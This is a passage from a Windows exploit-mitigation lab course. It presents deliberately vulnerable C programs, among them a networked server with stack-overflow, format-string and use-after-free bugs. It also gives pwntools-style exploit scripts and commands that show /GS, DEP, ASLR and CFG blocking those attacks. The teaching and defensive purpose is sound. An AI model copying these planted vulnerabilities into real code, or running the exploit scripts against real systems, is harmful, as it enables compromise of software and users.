# NOTE: Exit code varies by Windows version and WER (Windows Error Reporting) settings
#       - Older Windows: CFG uses __fastfail(10) -> int 0x29 -> exit 0x80000003
#       - Newer Windows: Both /GS and CFG may exit with 0xC0000409 (STATUS_STACK_BUFFER_OVERRUN)
#       - The important part: Process terminates immediately, cannot be caught by SEH
```

### Practical Exercise

#### Task 1: Mitigation Blocking Demo

**Test Binary**: Use this vulnerable code to test each mitigation:

```c
// mitigation_demo.c - Vulnerable to multiple attack types
// Compile WITHOUT protections first, then WITH to compare
//
// NO PROTECTIONS: cl /GS- mitigation_demo.c /link /NXCOMPAT:NO /DYNAMICBASE:NO
// WITH PROTECTIONS: cl /GS /guard:cf mitigation_demo.c /link /NXCOMPAT /DYNAMICBASE /guard:cf

#include <windows.h>
#include <stdio.h>
#include <string.h>

// Vulnerability 1: Stack buffer overflow (tests DEP + Stack Cookies)
void vuln_stack(const char* input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds check!
    printf("Copied: %s\n", buffer);
}

// Vulnerability 2: Function pointer hijack (tests CFG)
typedef void (*callback_t)(void);
void safe_func() { printf("Safe function called\n"); fflush(stdout); }
void evil_func() {
    printf("HIJACKED! Function pointer redirected to evil_func.\n");
    printf("NOTE: CFG ALLOWS this because evil_func IS a valid function.\n");
    printf("CFG only blocks calls to non-function addresses (shellcode/ROP).\n");
    fflush(stdout);
}

struct target {
    char data[64];
    callback_t cb;
};

void vuln_cfg(const char* input) {
    struct target t;
    t.cb = safe_func;
    strcpy(t.data, input);  // Can overflow into cb pointer
    fflush(stdout);
    t.cb();  // CFG checks if target is valid
    // If overflow redirects to evil_func: CFG ALLOWS (valid function)
    // If overflow redirects to arbitrary address: CFG BLOCKS
}

// Vulnerability 3: Format string (tests ASLR effectiveness)
void vuln_format(const char* input) {
    printf(input);  // Direct format string
    printf("\n");
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <stack|cfg|format> <input>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "stack") == 0) vuln_stack(argv[2]);
    else if (strcmp(argv[1], "cfg") == 0) vuln_cfg(argv[2]);
    else if (strcmp(argv[1], "format") == 0) vuln_format(argv[2]);

    return 0;
}
```

**Pwntools-Style Exploit Testing Script**:

```python
#!/usr/bin/env python3
# mitigation_test_exploit.py - Test exploits against mitigations
# Run against both unprotected and protected binaries

import subprocess
import struct
import sys

def test_dep_bypass(binary):
    """Attempt shellcode execution - DEP should block"""
    print("\n" + "="*50)
    print("[TEST 1] DEP - Shellcode Execution")
    print("="*50)

    # Large overflow to ensure we hit the return address/cookie
    # Use printable characters to avoid string termination issues
    payload = "A" * 200

    try:
        result = subprocess.run([binary, "stack", payload],
                               capture_output=True, timeout=5)

        exit_code = result.returncode & 0xFFFFFFFF if result.returncode < 0 else result.returncode

        if exit_code == 0xC0000409 or result.returncode == -1073740791:  # Stack buffer overrun
            print("[+] STACK COOKIE BLOCKED: Buffer overrun detected")
            print(f"    Exit code: {hex(exit_code)} ({result.returncode})")
            return True
        elif exit_code == 0xC0000005:  # Access violation
            print("[+] DEP BLOCKED: Access violation (expected)")
            return True
        elif result.returncode == 0:
            print("[-] No crash detected - overflow may be too small")
            return False
        else:
            print(f"[-] Unexpected result: {hex(exit_code)} ({result.returncode})")
            return False
    except subprocess.TimeoutExpired:
        print("[*] Process hung - possible infinite loop")
        return False
    except Exception as e:
        print(f"[*] Exception: {e}")
        return False

def test_aslr_leak(binary):
    """Attempt to leak addresses - ASLR makes them unpredictable"""
    print("\n" + "="*50)
    print("[TEST 2] ASLR - Address Leak Attempt")
    print("="*50)

    # Format string to leak stack addresses
    payload = "%p." * 15

    try:
        result = subprocess.run([binary, "format", payload],
                               capture_output=True, text=True, timeout=5)

        leaks = result.stdout.split('.')
        print("[*] Leaked addresses:")

        addresses = []
        for leak in leaks:
            if leak.startswith('0x') or leak.startswith('00'):
                try:
                    addr = int(leak, 16)
                    if addr > 0x10000:
                        addresses.append(addr)
                        print(f"    {hex(addr)}")
                except:
                    pass

        if len(addresses) > 0:
            print(f"\n[*] Leaked {len(addresses)} addresses")
            print("[!] With ASLR, these addresses change each run")
            print("[*] Run again to verify randomization:")
            return True
        else:
            print("[-] No addresses leaked")
            return False
    except Exception as e:
        print(f"[*] Exception: {e}")
        return False

def test_cfg_bypass(binary):
    """Attempt function pointer hijack - CFG should block"""
    print("\n" + "="*50)
    print("[TEST 3] CFG - Function Pointer Hijack")
    print("="*50)

    # Large overflow to ensure we corrupt the function pointer
    # Use printable characters to avoid string termination
    payload = "A" * 200

    try:
        result = subprocess.run([binary, "cfg", payload],
                               capture_output=True, timeout=5)

        exit_code = result.returncode & 0xFFFFFFFF if result.returncode < 0 else result.returncode

        if exit_code == 0x80000003 or result.returncode == -2147483645:  # STATUS_BREAKPOINT (__fastfail)
            print("[+] CFG BLOCKED: __fastfail(10) -> exit 0x80000003")
            print(f"    Exit code: {hex(exit_code)} ({result.returncode})")
            return True
        elif exit_code == 0xC0000409 or result.returncode == -1073740791:  # /GS cookie
            print("[+] /GS BLOCKED: Cookie corruption before CFG check")
            print(f"    Exit code: {hex(exit_code)} ({result.returncode})")
            return True
        elif exit_code == 0xC0000005:
            print("[+] CRASHED: Access violation")
            print(f"    Exit code: {hex(exit_code)} ({result.returncode})")
            return False
        elif result.returncode == 0:
            print("[-] No crash detected - overflow may be too small")
            return False
        else:
            print(f"[-] Unexpected result: {hex(exit_code)} ({result.returncode})")
            return False
    except subprocess.TimeoutExpired:
        print("[*] Process hung - possible infinite loop")
        return False
    except Exception as e:
        print(f"[*] Exception: {e}")
        return False

def run_all_tests(binary):
    """Run all mitigation tests"""
    print("="*60)
    print(f"MITIGATION TEST SUITE - Target: {binary}")
    print("="*60)

    results = {
        "DEP": test_dep_bypass(binary),
        "ASLR": test_aslr_leak(binary),
        "CFG": test_cfg_bypass(binary)
    }

    print("\n" + "="*60)
    print("RESULTS SUMMARY")
    print("="*60)
    for mitigation, blocked in results.items():
        status = "BLOCKED" if blocked else "BYPASSED/UNKNOWN"
        color = "+" if blocked else "-"
        print(f"[{color}] {mitigation}: {status}")

    print("\n[*] Compare results between:")
    print("    - Binary compiled WITHOUT protections")
    print("    - Binary compiled WITH protections")
    print("    - The difference shows mitigation effectiveness!")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python mitigation_test_exploit.py <binary>")
        print("Example: python mitigation_test_exploit.py mitigation_demo.exe")
        sys.exit(1)

    run_all_tests(sys.argv[1])
```

**Compile and Test Instructions**:

```bash
# Save files
# - mitigation_demo.c -> C:\Windows_Mitigations_Lab\src\mitigation_demo.c
# - mitigation_test_exploit.py -> C:\Windows_Mitigations_Lab\exploits\mitigation_test_exploit.py

cd C:\Windows_Mitigations_Lab

# Step 1: Compile WITHOUT protections (vulnerable baseline)
cl /GS- src\mitigation_demo.c /Fe:bin\mitigation_demo_unprotected.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO
# Flags explained:
#   /GS-           = Disable stack cookies
#   /NXCOMPAT:NO   = Disable DEP
#   /DYNAMICBASE:NO = Disable ASLR

# Step 2: Compile WITH all protections
cl /GS /Zi /guard:cf src\mitigation_demo.c /Fe:bin\mitigation_demo_protected.exe /link /NXCOMPAT /DYNAMICBASE /guard:cf /DEBUG
# Flags explained:
#   /GS            = Enable stack cookies
#   /guard:cf      = Enable CFG (compile-time)
#   /NXCOMPAT      = Enable DEP
#   /DYNAMICBASE   = Enable ASLR
#   /guard:cf      = Enable CFG (link-time)

# Step 3: Test unprotected binary (should be exploitable)
python exploits\mitigation_test_exploit.py bin\mitigation_demo_unprotected.exe

# Step 4: Test protected binary (mitigations should block)
python exploits\mitigation_test_exploit.py bin\mitigation_demo_protected.exe

# Step 5: Compare results
# Unprotected: Exploits may succeed or crash without mitigation detection
# Protected: Should see specific mitigation blocks (DEP, /GS, CFG)

# Manual testing examples:
# Test stack overflow
.\bin\mitigation_demo_protected.exe stack AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# Test format string (leak addresses)
.\bin\mitigation_demo_protected.exe format "%p.%p.%p.%p.%p.%p.%p.%p"

# Test CFG (overflow function pointer)
.\bin\mitigation_demo_protected.exe cfg AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**Testing CFG and /GS Separately**:

The above tests show /GS catching overflows before CFG is tested. To test them independently:

```c
// cfg_isolated_test.c - Test CFG without /GS interference
// Save to: C:\Windows_Mitigations_Lab\src\cfg_isolated_test.c

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef void (*callback_t)(void);

void safe_function() {
    printf("[*] Safe function called\n");
}

void evil_function() {
    printf("[!] Evil function called (CFG allows - valid function)\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <valid|invalid|overflow>\n", argv[0]);
        return 1;
    }

    // Allocate on heap to avoid /GS stack cookies
    callback_t* func_ptr = (callback_t*)malloc(sizeof(callback_t));
    *func_ptr = safe_function;

    if (strcmp(argv[1], "valid") == 0) {
        // Test 1: Call valid function (should work)
        printf("[TEST] Calling valid function pointer\n");
        (*func_ptr)();

    } else if (strcmp(argv[1], "invalid") == 0) {
        // Test 2: Call invalid address (CFG should block)
        printf("[TEST] Calling invalid address 0x41414141\n");
        printf("[*] CFG should block this with __fastfail\n");
        fflush(stdout);
        *func_ptr = (callback_t)0x41414141;
        (*func_ptr)();  // CFG blocks here

    } else if (strcmp(argv[1], "overflow") == 0) {
        // Test 3: Overflow to corrupt pointer (no /GS on heap)
        printf("[TEST] Heap overflow to corrupt function pointer\n");

        // Enable Low-Fragmentation Heap for tighter packing
        HANDLE heap = GetProcessHeap();
        ULONG heapFragValue = 2;
        HeapSetInformation(heap, HeapCompatibilityInformation,
                          &heapFragValue, sizeof(heapFragValue));

        // Prime the LFH by allocating many same-sized chunks
        // This activates LFH for this size class (64 bytes)
        #define PRIME_COUNT 20
        void* priming[PRIME_COUNT];
        for (int i = 0; i < PRIME_COUNT; i++) {
            priming[i] = HeapAlloc(heap, 0, 64);
        }

        // Free every other one to create holes
        for (int i = 0; i < PRIME_COUNT; i += 2) {
            HeapFree(heap, 0, priming[i]);
        }

        // Now allocate our target chunks - should fill the holes adjacently
        char* buffer = (char*)HeapAlloc(heap, 0, 64);
        callback_t* target = (callback_t*)HeapAlloc(heap, 0, 64);
        *target = safe_function;

        printf("[*] buffer=%p, target=%p, distance=%lld bytes\n",
               buffer, target, (long long)((char*)target - buffer));

        long long distance = (long long)((char*)target - buffer);
        if (distance > 0 && distance <= 128) {
            printf("[+] Chunks are adjacent! Overflow will corrupt function pointer\n");
        } else if (distance < 0 && distance >= -128) {
            printf("[!] Target is BEFORE buffer (distance=%lld)\n", distance);
            printf("[*] Overflow won't reach it, but this shows heap layout\n");
        } else {
            printf("[!] Chunks not adjacent (distance=%lld bytes)\n", distance);
            printf("[*] Modern heap security: randomization prevents reliable overflow\n");
        }

        // Overflow buffer to corrupt target function pointer
        // Fill with pattern that creates invalid address (0x4141414141414141)
        if (distance > 0 && distance <= 128) {
            printf("[*] Overflowing buffer to corrupt function pointer...\n");
            memset(buffer, 0x41, distance + 8);  // Overflow exactly to target
        } else {
            printf("[*] Attempting overflow anyway (for demonstration)...\n");
            memset(buffer, 0x41, 128);
        }

        printf("[*] Calling function pointer (CFG will check validity)...\n");
        fflush(stdout);
        (*target)();  // If corrupted to 0x4141..., CFG blocks with __fastfail

        printf("[*] Function call succeeded - pointer was not corrupted\n");

        // Cleanup
        HeapFree(heap, 0, buffer);
        HeapFree(heap, 0, target);
        for (int i = 1; i < PRIME_COUNT; i += 2) {
            HeapFree(heap, 0, priming[i]);
        }
    }

    free(func_ptr);
    return 0;
}
```

```bash
# Compile CFG-only test (no /GS to avoid interference)
cl /GS- /Zi /guard:cf src\cfg_isolated_test.c /Fe:bin\cfg_isolated_test.exe /link /guard:cf /DEBUG

# Test 1: Valid function call (should work)
.\bin\cfg_isolated_test.exe valid

# Test 2: Invalid address (CFG should block)
.\bin\cfg_isolated_test.exe invalid
echo Exit code: %errorlevel%
# Expected: -1073740791 (0xC0000409) or -2147483645 (0x80000003)
# CFG detected invalid function pointer and called __fastfail

# Test 3: Heap overflow (corrupts adjacent function pointer)
.\bin\cfg_isolated_test.exe overflow
echo Exit code: %errorlevel%
# Expected behaviors:
#   - If chunks adjacent: CFG blocks corrupted pointer -> exit -1073740791
#   - If chunks not adjacent: Safe function called (no corruption)
# Note: LFH packing is probabilistic - run multiple times if needed
# You can also run in a loop to see CFG catch it:
for /L %i in (1,1,10) do @(.\bin\cfg_isolated_test.exe overflow 2>nul && echo Run %i: No crash) || echo Run %i: CFG BLOCKED
```

```bash
# Compile /GS-only test (no CFG to avoid interference)
cl /GS /Zi src\mitigation_demo.c /Fe:bin\gs_isolated_test.exe /link /NXCOMPAT /DYNAMICBASE /DEBUG

# Test stack overflow (should trigger /GS)
.\bin\gs_isolated_test.exe stack AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo Exit code: %errorlevel%
# Expected: -1073740791 (0xC0000409 - STATUS_STACK_BUFFER_OVERRUN)
```

### Task 2: Audit two systems and compare security postures

1. **System A: Default Windows 10**
   - Run mitigation audit script
   - Document all findings
   - Test binaries for protections

2. **System B: Hardened Windows 11**
   - Enable ALL mitigations:
     - VBS + HVCI
     - Credential Guard
     - Exploit Protection policies
     - CET (if supported)
   - Run same audit
   - Compare results

3. **Binary Analysis**:
   - Analyze 10 Windows binaries
   - Check for all protections
   - Document which lack protections

4. **Exploit Testing**:
   - Take Week 5 exploits
   - Test against hardened system
   - Document which protections block which exploits

5. **Final Report**:

   ```markdown
   # Windows Security Audit Report

   ## System Configuration

   - OS Version:
   - Patch Level:
   - Hardware:

   ## Mitigation Status

   | Mitigation | Status | Notes               |
   | ---------- | ------ | ------------------- |
   | DEP        | +      | Opt-Out policy      |
   | ASLR       | +      | High Entropy on x64 |
   | CFG        | +      | System-wide         |
   | CET        | -      | CPU not supported   |
   | VBS        | +      | Running with HVCI   |
   | Cred Guard | +      | Active              |

   ## Binary Analysis Results

   [List of 10 binaries with protection status]

   ## Exploit Test Results

   [Which Week 5 exploits were blocked]

   ## Recommendations

   [Steps to improve security posture]
   ```

**Success Criteria**:

- Comprehensive audit completed
- All mitigations tested
- Binary analysis for 10+ executables
- Week 5 exploits blocked
- Professional security report generated

### Discussion Questions

1. **Why is "Enforcement" (Blocking) better than "Audit" (Logging), but harder to implement?**

   > Enforcement prevents the attack in real-time. Audit only logs that it WOULD have
   > been blocked — the attack still succeeds. But enforcement risks breaking legitimate
   > applications. The safe approach: deploy in Audit mode first, analyze event logs
   > (Event ID 3076) for false positives, then switch to Enforcement (Event ID 3077)
   > after validating no business-critical apps are affected.

2. **If you were a red teamer, which mitigation would annoy you the most?**

   > CET (shadow stacks) — because it's hardware-enforced with no known generic bypass.
   > CFG can be bypassed via valid-function redirects (proven in Day 2-3). ASLR can be
   > defeated with info leaks. /GS can be bypassed with info disclosure + partial
   > overwrites (proven in Day 2). But CET has no "allowed" bypass case — you must
   > abandon ROP entirely and pivot to data-only attacks.

3. **How does the "Assume Breach" mentality relate to VBS/Credential Guard?**
   > "Assume Breach" means planning for the scenario where an attacker already has
   > admin/SYSTEM access. Without Credential Guard, SYSTEM can dump all domain
   > credentials. With Credential Guard, even SYSTEM cannot access VTL 1 secrets.
   > This limits lateral movement even after full compromise of a single machine.

### Key Takeaways

1. **Exit codes distinguish mitigations**: /GS cookie failure = `0xC0000409`, CFG failure =
   `0x80000003`, DEP violation = `0xC0000005`, heap corruption = `0xC0000374`. Knowing
   these codes lets you identify WHICH mitigation blocked an exploit in crash analysis.
2. **\_\_fastfail() bypasses SEH entirely**: Both /GS and CFG use `__fastfail()` which
   executes `int 0x29` — trapping directly to the kernel. No `__try/__except` handler
   can catch it. Test these mitigations as separate processes and check exit codes.
3. **Audit tools are essential**: `dumpbin /headers`, `BinSkim`, and `Get-ProcessMitigation`
   reveal which binaries lack protections. A single unprotected DLL in your process can
   be the entry point for an exploit.
4. **CFG coarse-grained limitation persists in testing**: The mitigation_demo's `evil_func`
   is a valid function entry point — CFG allows the call. Only calls to non-function
   addresses (shellcode, ROP gadgets, `0x41414141`) are blocked.
5. **System-wide policy overrides binary preferences**: Even if a binary was compiled
   with `/NXCOMPAT:NO`, system-level `Set-ProcessMitigation` can force DEP on. This is
   how security teams protect legacy binaries without recompilation.
6. **BinSkim is the modern replacement for BinScope**: BinSkim checks 15+ security rules
   and integrates with CI/CD via SARIF output. Use it as a build gate.
7. **Windows 11 24H2 Hotpatching changes forensics**: Code pages in memory may not match
   on-disk binaries after hotpatch application. This affects both defenders (memory
   analysis) and attackers (persistence assumptions).

## Day 7: Capstone Project - The Hardening Campaign

- **Goal**: Apply all learned mitigations to secure a vulnerable "legacy" Windows 10 system against known exploits.
- **Activities**:
  - **Assess**: Audit the provided vulnerable VM (Week 5 environment).
  - **Harden**: Enable DEP, ASLR, CFG, VBS, and HVCI.
  - **Verify**: Run the "Exploitation Gauntlet" from Week 5 against the hardened system.
  - **Report**: Document which exploits failed and why.

### The Challenge: SecureServer v1.0

You are given the `vuln_server` from Week 5, running on a default Windows 10 install.
Your Week 5 exploits (Stack Overflow, UAF) currently work.

**Task**:

1.  **Baseline**: Run `mitigation_audit.ps1` to confirm lack of protections.
2.  **Recompile**: Rebuild `vuln_server` with `/GS`, `/NXCOMPAT`, `/DYNAMICBASE`, `/guard:cf`, `/HIGHENTROPYVA`.
3.  **OS Hardening**: Enable VBS, HVCI, and system-wide DEP (Opt-Out).
4.  **Attack**:
    - Try `auth` exploit (Stack Overflow) -> Should fail (DEP or Stack Cookie).
    - Try `note` exploit (UAF) -> Should fail (Segment Heap/MemGC if enabled, or harder to exploit).
    - Try `echo` exploit (Format String) -> ASLR should make addresses unpredictable.

### Practical Exercise: Day 7 Capstone

**Lab 7.1: Compile and Test Vulnerable Server**

```c
// vuln_server_capstone.c - Week 5 server with multiple vulnerabilities
// Compile WITHOUT protections first:
// cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\vuln_server_capstone.c /Fe:bin\vuln_capstone_weak.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO /DEBUG
// Then WITH protections:
// cl /GS /Zi /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vuln_server_capstone.c /Fe:bin\vuln_capstone_hard.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA /guard:cf /DEBUG

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

#define PORT 4444
#define BUFSIZE 1024  // Large recv buffer to allow overflow payloads through

// Vulnerability 1: Stack overflow in auth handler
void handle_auth(char* input) {
    char password[64];
    strcpy(password, input);  // OVERFLOW!

    if (strcmp(password, "secret123") == 0) {
        printf("[+] Auth success\n");
    } else {
        printf("[-] Auth failed\n");
    }
    fflush(stdout);
}

// Vulnerability 2: Format string
void handle_log(char* input) {
    printf("[LOG] ");
    printf(input);  // FORMAT STRING!
    printf("\n");
    fflush(stdout);
    // NOTE: On MSVCRT, %p prints bare hex (no 0x prefix)
    // and positional parameters (%N$x) are NOT supported
}

// Vulnerability 3: Use-after-free simulation
typedef struct {
    char data[64];
    void (*callback)(void);
} UserObj;

UserObj* g_user = NULL;

void safe_callback() { printf("[*] Safe callback\n"); fflush(stdout); }
void admin_callback() { printf("[!] ADMIN ACCESS GRANTED\n"); fflush(stdout); }

void handle_alloc() {
    g_user = (UserObj*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UserObj));
    g_user->callback = safe_callback;
    printf("[+] User allocated at %p\n", g_user);
    fflush(stdout);
}

void handle_free() {
    HeapFree(GetProcessHeap(), 0, g_user);
    printf("[+] User freed (but pointer not nulled!)\n");
    fflush(stdout);
    // NOTE: g_user is now a dangling pointer
    // The pointer is NOT set to NULL — use-after-free is possible
}

void handle_use(char* input) {
    if (g_user) {
        strcpy(g_user->data, input);
        fflush(stdout);
        g_user->callback();
        // With CFG: if callback was overwritten to a valid function
        //   (like admin_callback), CFG ALLOWS it (coarse-grained!)
        // With CFG: if callback was overwritten to shellcode address,
        //   CFG BLOCKS it with exit code 0x80000003
    }
}

int main() {
    WSADATA wsa;
    SOCKET server, client;
    struct sockaddr_in addr;
    char buffer[BUFSIZE];

    WSAStartup(MAKEWORD(2,2), &wsa);
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    bind(server, (struct sockaddr*)&addr, sizeof(addr));
    listen(server, 1);

    printf("[*] Capstone Server on port %d\n", PORT);
    printf("[*] Commands: AUTH <pass>, LOG <msg>, ALLOC, FREE, USE <data>\n");
    fflush(stdout);

    while ((client = accept(server, NULL, NULL)) != INVALID_SOCKET) {
        memset(buffer, 0, BUFSIZE);
        recv(client, buffer, BUFSIZE-1, 0);

        if (strncmp(buffer, "AUTH ", 5) == 0) handle_auth(buffer+5);
        else if (strncmp(buffer, "LOG ", 4) == 0) handle_log(buffer+4);
        else if (strncmp(buffer, "ALLOC", 5) == 0) handle_alloc();
        else if (strncmp(buffer, "FREE", 4) == 0) handle_free();
        else if (strncmp(buffer, "USE ", 4) == 0) handle_use(buffer+4);

        closesocket(client);
    }

    return 0;
}
```

**Lab 7.2: Pwntools Exploit - Test Against Hardened Server**

```python
#!/usr/bin/env python3
# capstone_exploit.py - Exploit that works WITHOUT mitigations, fails WITH
# This demonstrates Week 6 mitigations blocking Week 5 attacks

from pwn import *
import struct
import sys
import time

# Configuration
HOST = "127.0.0.1"
PORT = 4444

def exploit_stack_overflow():
    """Stack overflow - blocked by DEP + Stack Cookies"""
    print("\n" + "="*60)
    print("[EXPLOIT 1] Stack Buffer Overflow (AUTH)")
    print("="*60)

    # Shellcode (x64 Windows - calc.exe launcher pattern)
    # This is BLOCKED by DEP (cannot execute stack)
    shellcode = b"\x90" * 50  # NOP sled
    shellcode += b"\xCC" * 4  # INT3 (breakpoint for testing)

    # Overflow pattern
    offset = 64  # Buffer size
    payload = b"A" * offset
    payload += b"BBBBBBBB"  # Saved RBP (will corrupt stack cookie first!)
    payload += struct.pack("<Q", 0x41414141)  # Return address
    payload += shellcode

    try:
        io = remote(HOST, PORT, timeout=5)
        io.send(b"AUTH " + payload)
        io.close()

        print("[-] Sent overflow payload")
        print("[*] Expected result WITHOUT mitigations: Code execution")
        print("[*] Expected result WITH mitigations:")
        print("    - /GS: Process terminates (cookie corrupted)")
        print("    - DEP: Access violation if shellcode reached")
        print("    - ASLR: Return address wrong anyway")
    except Exception as e:
        print(f"[*] Connection error (server may have crashed): {e}")
        print("[+] If server crashed: Mitigation likely triggered!")

def exploit_format_string():
    """Format string info leak - ASLR makes this less useful"""
    print("\n" + "="*60)
    print("[EXPLOIT 2] Format String Information Leak (LOG)")
    print("="*60)

    # Leak stack addresses
    leak_payload = b"%p." * 20

    try:
        io = remote(HOST, PORT, timeout=5)
        io.send(b"LOG " + leak_payload)
        io.close()

        print("[*] Sent format string payload: %p.%p.%p...")
        print("[*] Without ASLR: Addresses are predictable across runs")
        print("[*] With ASLR: Addresses randomized - exploit unreliable")
        print("[*] Check server output for leaked addresses")
    except Exception as e:
        print(f"[*] Error: {e}")

def exploit_uaf():
    """Use-after-free - heap hardening makes this harder"""
    print("\n" + "="*60)
    print("[EXPLOIT 3] Use-After-Free (ALLOC/FREE/USE)")
    print("="*60)

    try:
        # Step 1: Allocate object
        io = remote(HOST, PORT, timeout=5)
        io.send(b"ALLOC")
        io.close()
        print("[1] Allocated user object")

        # Step 2: Free object (but pointer not nulled)
        io = remote(HOST, PORT, timeout=5)
        io.send(b"FREE")
        io.close()
        print("[2] Freed object (dangling pointer)")

        # Step 3: Try to reallocate with controlled data
        # On unprotected heap: might reclaim same memory
        fake_vtable = struct.pack("<Q", 0x41414141)  # Fake callback ptr
        payload = b"A" * 64 + fake_vtable

        io = remote(HOST, PORT, timeout=5)
        io.send(b"USE " + payload)
        io.close()
        print("[3] Used freed object with controlled data")

        print("[*] Without heap hardening: Callback hijacked")
        print("[*] With Segment Heap/LFH: Reallocation unpredictable")
        print("[*] With CFG + shellcode address: Call BLOCKED (exit 0x80000003)")
        print("[*] With CFG + valid function (admin_callback): Call ALLOWED!")
        print("[*]   -> CFG is coarse-grained (proven in Day 2-3)")
    except Exception as e:
        print(f"[*] Error: {e}")

def run_all_exploits():
    """Run all exploits and compare results"""
    print("="*70)
    print("CAPSTONE EXPLOIT SUITE - Mitigations Test")
    print("="*70)
    print(f"Target: {HOST}:{PORT}")
    print()
    print("Run this against TWO versions of the server:")
    print("1. Compiled WITHOUT protections (exploits should work)")
    print("2. Compiled WITH protections (exploits should fail)")
    print()

    input("Press Enter to start exploit chain...")

    exploit_stack_overflow()
    time.sleep(1)

    exploit_format_string()
    time.sleep(1)

    exploit_uaf()

    print("\n" + "="*70)
    print("RESULTS ANALYSIS")
    print("="*70)
    print("""
Document for each exploit:

| Exploit         | No Mitigations | With Mitigations | Blocking Mitigation |
|-----------------|----------------|------------------|---------------------|
| Stack Overflow  | RCE Achieved   | Crash/Block      | /GS, DEP, ASLR      |
| Format String   | Info Leaked    | Info Leaked*     | ASLR (partial)      |
| Use-After-Free  | Callback Hijack| Blocked          | CFG, Heap Hardening |

* Format string still works, but ASLR makes leaked addresses useless
  for subsequent attacks since they change each run.
""")

if __name__ == "__main__":
    run_all_exploits()
```

**Lab 7.3: Document Results**

Create a "Hardening Report" documenting:

1. Initial vulnerability state
2. Each mitigation enabled
3. Exploit test results before/after
4. Recommendations for enterprise deployment

**Testing Tips**:

- Restart the server between exploit runs (it crashes after stack overflow)
- Run exploits individually to see each result clearly:
  ```bash
  # Test one exploit at a time
  python -c "from capstone_exploit import *; exploit_stack_overflow()"
  python -c "from capstone_exploit import *; exploit_format_string()"
  python -c "from capstone_exploit import *; exploit_uaf()"
  ```
- Compare server output between weak and hardened versions
- Use `Check-Mitigations` to verify binary protections:
  ```bash
  Check-Mitigations "bin\vuln_capstone_weak.exe"
  Check-Mitigations "bin\vuln_capstone_hard.exe"
  ```

### Capstone Checklist

- [ ] `vuln_server_capstone` compiled WITHOUT protections - exploits work
- [ ] `vuln_server_capstone` recompiled WITH full mitigations
- [ ] Windows OS hardened (VBS/HVCI enabled)
- [ ] All three exploits confirmed blocked
- [ ] "Hardening Report" generated with before/after comparison

### Key Takeaways - Day 7

1. **Mitigations are layers, not walls**: No single mitigation stops everything. /GS catches
   the overflow, DEP blocks shellcode execution, ASLR makes addresses unpredictable, CFG
   validates indirect calls. Together they make exploitation exponentially harder.
2. **Default ≠ Secure**: Out-of-the-box Windows prioritizes compatibility. Many mitigations
   (VBS, HVCI, Credential Guard, ACG) must be explicitly enabled.
3. **Recompilation is the most impactful single action**: Adding `/GS /guard:cf /DYNAMICBASE
/HIGHENTROPYVA /NXCOMPAT` to the build immediately enables 5+ mitigations.
4. **CFG has a proven coarse-grained bypass**: The UAF exploit redirecting to
   `admin_callback` (a valid function) will PASS CFG validation even with
   `/guard:cf` enabled. This was proven throughout Days 2-4.
5. **Format strings still leak on Windows**: MSVCRT's `%p` outputs bare hex (no `0x` prefix)
   and does NOT support positional parameters (`%N$x`). ASLR makes leaked addresses
   per-session, but they're still useful within a single connection.
6. **Verification is mandatory**: You haven't secured it until you've tried to exploit it
   and failed. Compare exit codes: `0xC0000409` (/GS), `0x80000003` (CFG/CET),
   `0xC0000005` (DEP/access violation), `0xC0000374` (heap corruption).

### Discussion Questions

1. **Which mitigation was the most effective against the Stack Overflow exploit?**

   > /GS (stack cookies) — because it detects the overflow BEFORE the attacker gets
   > control. DEP would also block shellcode execution, but /GS terminates the process
   > at function epilogue, preventing any post-overflow actions. ASLR only helps if
   > the attacker needs to know addresses (which they do for ROP/ret2libc).

2. **Why might an organization hesitate to enable VBS/HVCI on all workstations?**

   > Performance impact (2-15%), driver compatibility issues (unsigned/non-compliant
   > drivers break), legacy application support, hardware requirements (VT-x, TPM),
   > and the inability to easily roll back if problems arise. VBS with UEFI lock
   > cannot be disabled without clearing the UEFI firmware.

3. **How does enabling ASLR affect the reliability of your exploits?**

   > Exploits using hardcoded addresses become unreliable — they work on one boot
   > but fail on the next. This forces attackers to add an information leak step
   > (demonstrated in Day 2 Technique 1 with format strings). The exploit chain
   > becomes: leak addresses -> calculate offsets -> deliver payload. This extra step
   > increases complexity and detection opportunity.

4. **If you could only enable ONE mitigation, which would it be and why?**
   > DEP (/NXCOMPAT) — because it eliminates the simplest and most common exploit
   > primitive: "overflow buffer, jump to shellcode." Without DEP, any buffer overflow
   > that controls the instruction pointer is immediately exploitable. With DEP,
   > attackers must use ROP or ret2libc, which requires knowing library addresses
   > (defeated by ASLR) and is much more complex. DEP is also the lowest-overhead
   > mitigation (hardware NX bit, no performance cost).

## Appendix A: CLFS Deep Dive

The Common Log File System (CLFS) driver has become the **most frequently exploited Windows kernel component** for privilege escalation, with 32 CVEs since 2022 and at least 6 exploited in the wild by ransomware groups.

### Why CLFS Matters for Vulnerability Researchers

```text
CLFS Exploitation Statistics (2022-2025):
-----------------------------------------
Total CVEs:                    32+
Exploited in-the-wild:         6+
Average CVEs per year:         10+
Primary threat actors:         Ransomware (Storm-2460, RansomExx)
